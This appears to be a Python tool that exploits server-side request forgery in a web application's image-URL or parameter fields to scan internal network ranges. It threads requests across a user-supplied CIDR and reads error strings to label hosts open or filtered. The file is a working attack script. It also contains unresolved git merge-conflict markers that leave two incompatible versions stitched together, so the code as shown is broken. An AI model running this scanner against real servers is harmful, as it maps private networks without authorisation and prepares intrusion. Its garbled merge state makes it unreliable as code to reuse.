import requests
<<<<<<< HEAD
from threading import Thread
import ipaddress

import request_parse
def scanNet(request_info, network, url):
    try:
        method, path , header, body = request_info
        body_data = body.copy()
        if 'profilePicture' in body_data:
            body_data['profilePicture'] = f"http://{network}"
        else:
            body_data['coverImage'] = f"http://{network}"
        rsp = requests.request(method, f"{url}{path}", headers=header, json=body_data, timeout=30)
        print(f"[{network}] Status: {rsp.status_code}")
        if rsp.status_code == 200 or ("ECONNREFUSED" in rsp.text):
            print(f"Network {network} is open.")
        elif "EHOSTUNREACH" in rsp.text or "ETIMEDOUT" in rsp.text:
            print(f"Network {network} is closed/filtered.")
        else:
            print(f"Network {network} response: {rsp.text}")
=======
from Module.runThread import threads

def scanNet(request_info, params, network, url):
    try:
        method, _ , header, body, is_json = request_info
        if method == "POST" or method == "PUT":
            body_data = body.copy()
            if params in body_data:
                body_data[params] = f"http://{network}"

            if is_json:
                response = requests.request(method, url, headers=header, json=body_data, timeout=3)
            else:
                body_str = "&".join([f"{k}={v}" for k, v in body_data.items()])
                response = requests.request(method, url, headers=header, data=body_str, timeout=3)
        elif method == "GET":
            response = requests.request(method, url, headers=header, params={params: f"http://{network}"}, timeout=3)   
        
        print(f"[{network}] Status: {response.status_code}")
        
        if response.status_code == 200:
            print(f"Network {network} is open.")
        else:
            body_res = response.text
            if "ECONNREFUSED" in body_res:
                print(f"Network {network} is open but connection refused.")
            else:
                print(body_res[:100])  
                print(f"Network {network} is closed/filtered.")
>>>>>>> 3c7d22bfb8026b3b49a150a14419db5d0046f2de
    except requests.exceptions.RequestException as exc:
        print(f"Network {network} lỗi: {exc}  ")


<<<<<<< HEAD
=======
def run(request_info, params,  url):
    target_subnet = input("Target IP/CIDR (e.g., 192.168.0.1/20): ").strip()
    network = ipaddress.ip_network(target_subnet, strict=False)
    networks = list(network.hosts())
    def worker(network):
        network_sc = str(network)
        scanNet(request_info, params, network_sc, url)

    threads(networks, worker)
>>>>>>> 3c7d22bfb8026b3b49a150a14419db5d0046f2de
